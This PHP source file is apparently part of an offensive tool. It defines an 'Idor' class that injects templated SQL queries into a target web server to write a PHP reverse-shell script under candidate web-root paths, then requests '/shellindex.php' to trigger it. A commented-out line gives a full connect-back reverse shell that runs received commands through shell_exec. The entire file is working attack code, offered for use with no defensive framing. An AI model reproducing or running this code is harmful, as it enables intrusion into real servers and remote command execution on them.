<?php
class Idor{
    public function init($payload,$host,$master){
        $this->sock=socket_create(AF_INET,SOCK_STREAM,0);
        $this->queries=json_decode(file_get_contents("queries.json"), true)["idor"];
        $this->payload=$payload;
        $this->master=$master;
        $this->host=str_replace(' ','',$host);
    }



    public function attack(){
        //var_dump($this->queries);
        socket_connect($this->sock,$this->host,80) or die("\n! unable to reach the server peer :(");
        echo "connected\n";
        $script=explode("\n",file_get_contents("scripts/tcp_reverse_shell.php"))[0];
        //$script='<?php $sock=socket_create(AF_INET,SOCK_STREAM,0); $host="127.0.0.1";$port=99999;socket_connect($sock,$host,$port);while (1){socket_write($sock,shell_exec(socket_read($sock,20480)));};
        foreach(explode("\n",file_get_contents("paths.txt")) as $key=>$root){
            $root=str_replace("\r","",$root);
                foreach($this->queries as $sqlquery){
                
                            
                            $sqlquery=str_replace('LHOST',$this->master[0],str_replace('INDEXPATH',$root,str_replace("SCRIPT",$script,$sqlquery)));
                            $sqlquery=str_replace('LPORT',$this->master[1],$sqlquery);
                            $sqlquery=str_replace("\n","",$sqlquery);
                            $this->payload=str_replace("formatted",urlencode($sqlquery),$this->payload);
                            socket_write($this->sock,$this->payload);
                            //echo $this->payload."\n\n\n\n\n";
                            
                            system("curl ".$this->host."/shellindex.php");
                            echo socket_read($this->sock,22024);
        //exit;
                        }
    }
    }


}
?>
